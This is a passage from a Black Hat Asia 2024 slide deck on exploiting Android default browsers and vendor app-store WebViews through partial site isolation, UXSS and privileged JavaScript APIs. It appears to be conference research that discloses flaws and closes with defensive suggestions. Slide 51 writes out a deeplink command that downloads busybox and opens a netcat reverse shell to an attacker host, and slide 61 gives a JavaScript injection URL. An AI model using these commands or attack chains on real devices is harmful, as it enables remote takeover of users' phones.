HANDLE hInputFile= CreateFile(inputFilePath, GENERIC_READ, 0,
NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
std::ofstreamoutputFile(outputFilePath, std::ios::binary);
DWORD fileSize= GetFileSize(hInputFile, NULL);
BYTE* inputData= newBYTE[fileSize];
DWORD bytesRead;
```

```
if(!ReadFile(hInputFile, inputData, fileSize, &bytesRead, NULL))
{
cb();
returnFALSE;
```

```
}
```

```
CloseHandle(hInputFile);
DecryptImpl(inputData);
outputFile.write(reinterpret_cast<const char*>(inputData),
bytesRead);
```

```
outputFile.close();
cb();
returnTRUE;
```

```
}
```

# BHASIA @BlackHatEvents

## Slide 43

##### Demo for Web-based APP on PC

Visible on site

###### **Remote Code Execution**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Demo for Web-based APP on
x... =
) > Program Files (x86)
Visible on site
Commit Charge: 72.72% Pr
Remote Code Execution
```

## Slide 44

#### Type 2: The default browser for phones

# BHASIA @BlackHatEvents

## Slide 45

##### The Design of Mobile Browser

**Why Vendors’ default Mobile Browser?**

- One of the few applications that can interact

- RCE is possible with just one click

- Pre-installed on your phone, no need to download

- Interactive points for mobile projects on pwn2own

This is an attractive target for security researchers !!

# BHASIA @BlackHatEvents

## Slide 46

##### The Design of Mobile Browser

###### **Vendors’ default Mobile Browser** vs **Android Chrome**

- The manufacturer's default browser is a secondary development based on Android

- Pre-installed on your phone, no need to download

- Interactive points for mobile projects on pwn2own

The site isolation mechanism implemented by the vendors’ default browser is similar to Android Chrome, both are **Partial Site-Isolation** .

So we can use the UXSS method mentioned earlier to inject JS into the records of the privileged domain to further control the privileged domain.

# BHASIA @BlackHatEvents

## Slide 47

##### The Design of Mobile Browser

###### **A Case: The default browser of mobile phone A**

- After testing, we found that there are some advertising functions in the browser, which

- enables silent installation of the App.

- After analysis, we found that such advertising functions can only be called from specific

- websites, which are privileged domains designated for mobile phone manufacturers.

# BHASIA @BlackHatEvents

## Slide 48

##### The Design of Mobile Browser

**Useful privilege API：**

- browser.openApp(app_name_string)

   - -> Apps can be opened based on the app_name_string

- browser.installApp(app_name_string, callback)

   - -> Apps can be installed based on the parameter app_name_string

   - ->  We can use the **parameter callback** to call openApp after installation.

# BHASIA @BlackHatEvents

## Slide 49

##### The Design of Mobile Browser

**This is not good enough:**

we found that **only apps in the app store** can be installed.

-> We need to upload a self-developed app with a backdoor to the app store, just like most of the pwn2own players in recent years.

However, this method takes more time and carries the risk of being discovered by the auditors, but **we have to rush to participate in TFC** .

Are there other ways to exploit it?

# BHASIA @BlackHatEvents

## Slide 50

##### The Design of Mobile Browser

**A possible solution：**

   - We can control the device through existing apps in some app stores.

- The App needs to be able to interact with us to achieve the effect of executing an arbitrary

- command.

   - After analysis, we identified the following applications:

**Terminal application** or **scripting language interpreter**

# BHASIA @BlackHatEvents

## Slide 51

The Design of Mobile Browser **Why terminal application ?**

We found that there is such an App that can execute the parameters passed in by deeplink as commands.

like this, **terminal://xlabxlab?cmd=${whoami}** So, we can reverse shell by download and run busybox as nc.

**terminal://xlabxlabt?cmd=**

**curl –o data/data/terminal.app/busybox http://$ip:$port/busybox;**

**chmod 755 data/data/terminal.app/busybox;**

**/data/data/terminal.app/busybox nc  $ip $port –e bin/sh**

# BHASIA @BlackHatEvents

## Slide 52

##### The Design of Mobile Browser

###### **And more flexible privileged API we need:**

- browser.startActivityWithDeeplink(deeplink_string)

   - -> Software can be launched based on deeplink_data

   - -> Compared with openApp, this method can pass arguments when starting the App.

# BHASIA @BlackHatEvents

## Slide 53

##### Demo

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
» Python =m SimpleHTTPSe | © p4nda@PWNDALIU-MB1 yay nc -l 7878
id
/® port 8@ ...
uid=10278(u0_a278) gid=10278(u@_a278) groups=10278(u@_a278), 3003(inet) ,99
6/Oct/2021 20:55:55] "GET / HTTP/1.1" 200 - 97 (everybody) ,20278(u@_a278_cache) ,50278(all_a278) context=u: r:untrusted_
6/O0ct/2021 20:55:55] "GET /conf.js HTTP/1.1" 200 - app_27:s0:c22,c257,c512,c768
L6/O0ct/2021 20:55:56] code 404, message File not foun whoami
u@_a278
16/0ct/2®21 20:55:56] “GET /favicon.ico HTTP/1.1"
404 )\ip a |ff
L16/Oct/2021 20:56:01).
“GET /exp.html HTTP/1.1" 200 -
{16/0ct/2021 20:56:06) "GET /busybox HTTP/1.1" 200 -
```

## Slide 54

Type 3: WebView based Android App with extremely high permissions

# BHASIA @BlackHatEvents

## Slide 55

##### The Design of Android App based WebView

**Why Android App based WebView?**

- Most of these can probably be launched from browser **(CATEGORY_BROWSABLE)**

**Android App based WebView** vs **Mobile Browser**

- The browser can load the content of any website

- But, Web-based App can generally display some manufacturer-related content.

- When the App receives some untrustworthy content, it may even jump to the browser to open it.

# BHASIA @BlackHatEvents

## Slide 56

##### The Design of Android App based WebView **A Case: The default app store of mobile phone A**

- The target app is the manufacturer's built-in app store application, similar to the

- Google Play application

   - Apps can be installed and opened silently from the target app

- The target app can probably be launched from browser

**In summary, the target application is a great target for pwn2own and TFC**

# BHASIA @BlackHatEvents

## Slide 57

##### The Design of Android App based WebView

###### **Activity 1：** start point of attack

- Exported, BROWSABLE, Registered for rich deeplinks

- handle Intent and Distributed to different web-based activities

- void handleIntent() {

Intent intent = getIntent();

- Uri data = intent.getData();

String targetPage = UriUtils.getTargetPage(data);

- **if** (TextUtils.equals(targetPage, PAGE_LITE_WEB)) { launchTargetActivity(LiteWebActivity. **class** ); **return** ;

- }

- // …

}

# BHASIA @BlackHatEvents

## Slide 58

##### The Design of Android App based WebView

Activity 1 divides links into three types to process separately:

- untrusted website

   - -> Jump to browser to open

-> www.baidu.com， www.google.com, …

- Manufacturer-related sites

   - -> Open in Activity with WebView with no Privileged API

-> read.x.com, music.x.com, …

- WebSites related to app store business

   - ->  Open in Activity of WebView with Privileged API

-> app.x.com, appstore.x.com, …

# BHASIA @BlackHatEvents

## Slide 59

##### The Design of Android App based WebView

###### **Activity 2:** Activity of WebView with Privileged API

- have privileged APIs we want to use

- No way to load untrusted domains

@JavascriptInterface **public boolean** usefulJSInterface1() { // …

- } @JavascriptInterface **public boolean** usefulJSInterface2() { // …

- }

# BHASIA @BlackHatEvents

## Slide 60

The Design of Android App based WebView **Useful privilege API in Activity 2：**

- market.install(app_name_string)

   - -> Apps can be opened based on the app_name_string

- market.install(app_name_string , callback)

   - -> Apps can be installed based on the app_name_string

   - ->  We can use the **parameter callback** to call openApp after installation.

# BHASIA @BlackHatEvents

## Slide 61

##### The Design of Android App based WebView

**But… we didn’t find a way to load our own website in Activity 2.**

**We have to find a way to load our Exp first!**

After some research, we found a target: **Activity 3** .

- Activity with WebView with no Privileged API

- But, a vulnerability that can inject arbitrary page content

market://web?url=JavaScript:document.write(evilcode)

# BHASIA @BlackHatEvents

## Slide 62

##### The Design of Android App based WebView

###### **What we have now?**

- Activity 1

   - -> Receive the Intent sent by the browser, and start Activity1 or Activity2

- Activity 2

-> privileged API to open and install apps

- Activity 3

   - -> Load arbitrary website via vulnerability

**Is it possible to attack WebView in Activity2 through WebView in Activity3?**

# BHASIA @BlackHatEvents

## Slide 63

##### The Design of Android App based WebView

**Emmm，After our testing:**

- WebViews between different Apps have complete site-isolation.

- But, there is only one WebView Renderer process in the same App.

   - -> That means **…**

      - -> Yes, there is **no site-isolation** between different Webviews in an App.

# BHASIA @BlackHatEvents

## Slide 64

##### The Design of Android App based WebView

**So, we completed the attacks：**

- Browser: Send Intent to launch Activity1 in app store

   - -> Activity 1 : Distribute Intent to launch Activity2

      - -> Activity 2 : Inject evil JS code

- Web Content in Activity 2 : Send Intent to launch Activity1 in app store

   - -> Activity 1 : Distribute Intent to launch Activity3

      - -> Activity 3 : invoke Privileged API to Install and open App

- Sandbox Escape

# BHASIA @BlackHatEvents

## Slide 65

##### Demo

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Demo
1537
7 8 9 —
4 5 6 ~
1 2 4
% 0
```

## Slide 66

##### Suggestions

###### **For the implementation of site isolation**

- Make heuristic site isolation configurable to protect privileged domain •  Perform same-origin judgment first and then decide whether to reuse the process

###### **For Web based App developers**

- Restrict privileges on JavaScript Interface API to prevent excessive privileges

- Use immutable code whenever possible to implement high-risk operations

# BHASIA @BlackHatEvents

## Slide 67

##### Acknowledgement

- **_Yang Yu (@tombkeeper)_**

- **_Wei Liu_**

- **_Yongke Wang (@Rudykewang)_**

- **_Huiming Liu (@liuhm09)_**

- **_Zheng Wang (@xmzyshypnc1)_**

- **_Guancheng Li (@Atuml1)_**

# BHASIA @BlackHatEvents

## Slide 68

# Thanks

Bohan Liu (@P4nda20371774) Haibin Shi (@aryb1n)

# BHASIA @BlackHatEvents
